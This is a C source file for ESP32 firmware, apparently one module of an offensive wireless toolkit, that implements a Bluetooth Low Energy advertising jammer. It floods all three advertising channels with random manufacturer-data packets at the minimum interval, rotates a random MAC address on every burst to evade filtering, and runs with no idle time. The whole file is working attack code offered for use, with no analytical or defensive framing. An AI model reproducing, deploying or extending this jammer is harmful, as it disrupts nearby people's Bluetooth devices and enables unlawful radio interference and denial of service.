#include "attack_bt_jammer.h"
#include "attack_bt_spam.h"
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_random.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"
static const char *TAG="attack_bt_jammer";
static bool running=false; static TaskHandle_t task=NULL; static SemaphoreHandle_t sem=NULL;
static void task_fn(void *arg){
    ESP_LOGI(TAG,"Jammer start - high rate random flood");
    int cnt=0;
    while(running){
        uint8_t adv[31]; esp_fill_random(adv,31); adv[0]=0x1E; adv[1]=0xFF; adv[2]=esp_random()&0xFF; adv[3]=esp_random()&0xFF;
        ble_gap_adv_stop();
        struct ble_gap_adv_params p={0};
        p.conn_mode=BLE_GAP_CONN_MODE_NON; p.disc_mode=BLE_GAP_DISC_MODE_NON;
        p.itvl_min=0x10; p.itvl_max=0x10; p.channel_map=0x07;
        ble_gap_adv_set_data(adv,31);
        // randomize MAC each burst
        uint8_t mac[6]; esp_fill_random(mac,6); mac[5]|=0xC0; ble_hs_id_set_rnd(mac);
        ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, 20, &p, NULL, NULL);
        vTaskDelay(pdMS_TO_TICKS(20));
        ble_gap_adv_stop();
        cnt++; if(cnt%50==0) ESP_LOGI(TAG,"Jammed %d",cnt);
        // no idle - max flood
    }
    ble_gap_adv_stop(); running=false; task=NULL; if(sem) xSemaphoreGive(sem); vTaskDelete(NULL);
}
void attack_bt_jammer_init(void){ if(sem==NULL) sem=xSemaphoreCreateBinary(); if(!ble_hs_synced()){ attack_bt_spam_init(); int t=50; while(!ble_hs_synced()&&t-->0) vTaskDelay(pdMS_TO_TICKS(100));}}
void attack_bt_jammer_start(bt_jammer_config_t *cfg){ if(running) return; if(sem) xSemaphoreTake(sem,0); running=true; xTaskCreate(task_fn,"bt_jammer",4096,NULL,5,&task);}
void attack_bt_jammer_stop(void){ if(!running&&!task) return; running=false; if(sem){ if(xSemaphoreTake(sem,pdMS_TO_TICKS(3000))!=pdTRUE){ if(task) vTaskDelete(task); task=NULL;}} else { vTaskDelay(pdMS_TO_TICKS(300)); if(task){vTaskDelete(task); task=NULL;}} ble_gap_adv_stop(); ESP_LOGI(TAG,"Jammer stopped");}
bool attack_bt_jammer_is_running(void){ return running; }
